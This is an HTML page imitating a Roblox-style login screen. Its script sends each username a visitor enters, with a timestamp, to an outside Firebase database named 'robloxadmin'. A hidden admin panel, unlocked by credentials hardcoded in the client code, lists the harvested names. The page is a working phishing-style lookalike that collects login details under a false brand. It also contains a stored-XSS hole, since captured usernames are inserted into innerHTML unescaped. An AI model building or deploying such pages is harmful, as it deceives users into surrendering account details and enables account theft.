<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>Robloxxx</title>

<link rel="icon"
href="https://cdn-icons-png.flaticon.com/512/25/25231.png">

<style>

/* RESET */

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

/* BODY */

body{
    background:black;
    color:white;
    overflow-x:hidden;
}

/* NAVBAR */

.navbar{

    width:100%;

    height:52px;

    background:#191b1f;

    position:fixed;

    top:0;
    left:0;

    display:flex;

    justify-content:space-between;

    align-items:center;

    padding:0 18px;

    border-bottom:1px solid #2d3138;

    z-index:999;
}

/* LEFT */

.nav-left{

    display:flex;

    align-items:center;

    gap:18px;
}

/* MENU */

.menu-icon{

    font-size:24px;

    color:white;

    cursor:pointer;
}

/* LOGO */

.logo-nav{

    width:34px;

    height:34px;

    border-radius:8px;
}

/* LINKS */

.nav-links{

    display:flex;

    align-items:center;

    gap:20px;
}

.nav-links a{

    color:#d7d7d7;

    text-decoration:none;

    font-size:15px;
}

.nav-links a:hover{

    color:white;
}

/* SEARCH */

.nav-center{

    position:absolute;

    left:50%;

    transform:translateX(-50%);
}

.search-bar{

    width:340px;

    padding:11px 16px;

    border:none;

    border-radius:8px;

    background:#2a2f3a;

    color:white;

    outline:none;
}

.search-bar::placeholder{

    color:#aaa;
}

/* SIGNUP */

.signup-btn{

    background:#0066ff;

    color:white;

    border:none;

    padding:8px 18px;

    border-radius:8px;

    cursor:pointer;

    font-weight:bold;
}

/* HERO */

.hero{

    min-height:100vh;

    display:flex;

    justify-content:center;

    align-items:center;

    padding-top:60px;

    background:

    linear-gradient(
    rgba(0,0,0,0.6),
    rgba(0,0,0,0.85)
    ),

    url('https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=2071');

    background-size:cover;

    background-position:center;
}

/* LOGIN BOX */

.login-box{

    width:92%;

    max-width:430px;

    background:#111217;

    border-radius:16px;

    padding:35px 28px;

    border:1px solid #2d3138;

    box-shadow:0 0 40px rgba(0,0,0,0.7);
}

/* TITLE */

.login-box h1{

    text-align:center;

    margin-bottom:24px;

    font-size:34px;
}

/* INPUT */

.input-box{

    position:relative;

    margin-bottom:16px;
}

.input-box input{

    width:100%;

    padding:15px;

    border:none;

    border-radius:12px;

    background:#2d313d;

    color:white;

    font-size:16px;

    outline:none;
}

.input-box input::placeholder{

    color:#aaa;
}

/* SHOW BUTTON */

.show-pass-btn{

    position:absolute;

    right:12px;

    top:50%;

    transform:translateY(-50%);

    background:none;

    border:none;

    color:#00aaff;

    font-weight:bold;

    cursor:pointer;
}

/* LOGIN BUTTON */

.login-btn{

    width:100%;

    padding:15px;

    border:2px solid white;

    border-radius:12px;

    background:transparent;

    color:white;

    font-size:18px;

    font-weight:bold;

    cursor:pointer;

    transition:0.3s;
}

.login-btn:hover{

    background:white;

    color:black;
}

/* EXTRA BUTTON */

.secondary-btn{

    width:100%;

    margin-top:14px;

    padding:14px;

    border:none;

    border-radius:12px;

    background:#373c4a;

    color:white;

    cursor:pointer;
}

/* LINKS */

.links{

    margin-top:18px;

    text-align:center;
}

.links a{

    color:#d0d0d0;

    text-decoration:none;
}

/* SIGNUP TEXT */

.signup-text{

    margin-top:24px;

    text-align:center;

    color:#aaa;
}

.signup-text a{

    color:white;

    text-decoration:none;

    font-weight:bold;
}

/* MESSAGE */

#message{

    margin-top:16px;

    text-align:center;

    color:#ff4d4d;
}

/* ADMIN PANEL */

#adminPanel{

    display:none;
}

/* PANEL */

.panel-box{

    margin-top:22px;

    background:#2a2f3a;

    border-radius:12px;

    padding:18px;

    max-height:420px;

    overflow-y:auto;
}

/* SAVED DATA */

.activity-card{

    background:#232833;

    padding:12px;

    border-radius:10px;

    margin-bottom:10px;

    font-size:14px;

    color:white;

    line-height:1.7;
}

/* MOBILE */

@media(max-width:900px){

    .nav-links{

        display:none;
    }

    .search-bar{

        width:190px;
    }

}

</style>
</head>

<body>

<!-- NAVBAR -->

<div class="navbar">

    <div class="nav-left">

        <div class="menu-icon">

            ☰

        </div>

        <img
        class="logo-nav"
        src="https://cdn-icons-png.flaticon.com/512/25/25231.png">

        <div class="nav-links">

            <a href="#">Home</a>

            <a href="#">Games</a>

            <a href="#">Studio</a>

            <a href="#">Shop</a>

        </div>

    </div>

    <!-- SEARCH -->

    <div class="nav-center">

        <input
        type="text"
        class="search-bar"
        placeholder="Search">

    </div>

    <!-- RIGHT -->

    <button class="signup-btn">

        Sign Up

    </button>

</div>

<!-- HERO -->

<div class="hero">

    <!-- LOGIN -->

    <div class="login-box" id="loginBox">

        <h1>Login to BlockWorld</h1>

        <!-- USERNAME -->

        <div class="input-box">

            <input
            type="text"
            id="username"
            placeholder="Username">

        </div>

        <!-- PASSWORD -->

        <div class="input-box">

            <input
            type="password"
            id="password"
            placeholder="Password">

            <button
            class="show-pass-btn"
            onclick="togglePassword()"
            id="toggleBtn">

            Show

            </button>

        </div>

        <!-- LOGIN -->

        <button
        class="login-btn"
        onclick="login()">

        Log In

        </button>

        <!-- LINKS -->

        <div class="links">

            <a href="#">

                Forgot Password or Username?

            </a>

        </div>

        <!-- EXTRA -->

        <button class="secondary-btn">

            Email Me a One-Time Code

        </button>

        <button class="secondary-btn">

            Use Another Device

        </button>

        <!-- SIGNUP -->

        <div class="signup-text">

            Don't have an account?

            <a href="#">

                Sign Up

            </a>

        </div>

        <p id="message"></p>

    </div>

    <!-- ADMIN PANEL -->

    <div class="login-box" id="adminPanel">

        <h1>Admin Panel</h1>

        <div class="panel-box">

            <h3>Saved Online Data</h3>

            <br>

            <div id="savedDataBox"></div>

        </div>

    </div>

</div>

<!-- FIREBASE -->

<script type="module">

/* FIREBASE IMPORTS */

import { initializeApp }

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {

    getDatabase,

    ref,

    push,

    onValue

}

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

/* FIREBASE CONFIG */

const firebaseConfig = {

  apiKey: "AIzaSyA5uGGN1a_ydQILFtz1RxI1JYJF3FoKZ6U",

  authDomain: "robloxadmin-5b4d1.firebaseapp.com",

  databaseURL: "https://robloxadmin-5b4d1-default-rtdb.firebaseio.com",

  projectId: "robloxadmin-5b4d1",

  storageBucket: "robloxadmin-5b4d1.firebasestorage.app",

  messagingSenderId: "1028232627372",

  appId: "1:1028232627372:web:cfb765f26fc2b045a44b09",

  measurementId: "G-XQXYL2DMEC"

};

/* START FIREBASE */

const app = initializeApp(firebaseConfig);

const db = getDatabase(app);

/* SHOW PASSWORD */

window.togglePassword = function(){

    const passInput =
    document.getElementById("password");

    const btn =
    document.getElementById("toggleBtn");

    if(passInput.type === "password"){

        passInput.type = "text";

        btn.innerText = "Hide";

    }

    else{

        passInput.type = "password";

        btn.innerText = "Show";

    }

};

/* SAVE DATA */

window.saveActivity = function(username){

    push(

        ref(db,"activities"),

        {

            username:username,

            time:new Date().toLocaleString()

        }

    );

};

/* SHOW ONLINE DATA */

onValue(

    ref(db,"activities"),

    (snapshot)=>{

        let output = "";

        let items = [];

        snapshot.forEach((child)=>{

            items.push(child.val());

        });

        items.reverse();

        items.forEach((item)=>{

            output += `

            <div class="activity-card">

            USERNAME :
            ${item.username}

            <br><br>

            TIME :
            ${item.time}

            </div>

            `;

        });

        document
        .getElementById("savedDataBox")
        .innerHTML = output;

    }

);

/* LOGIN */

window.login = function(){

    const user =
    document.getElementById("username").value;

    const pass =
    document.getElementById("password").value;

    if(user === "" || pass === ""){

        document
        .getElementById("message")
        .innerText =
        "Enter Username and Password";

        return;

    }

    /* SAVE USERNAME */

    saveActivity(user);

    /* ADMIN LOGIN */

    if(user === "naman"
    && pass === "adhikari"){

        document
        .getElementById("loginBox")
        .style.display = "none";

        document
        .getElementById("adminPanel")
        .style.display = "block";

    }

    else{

        document
        .getElementById("message")
        .innerText =
        "Invalid Username or Password";

    }

};

</script>

</body>
</html>
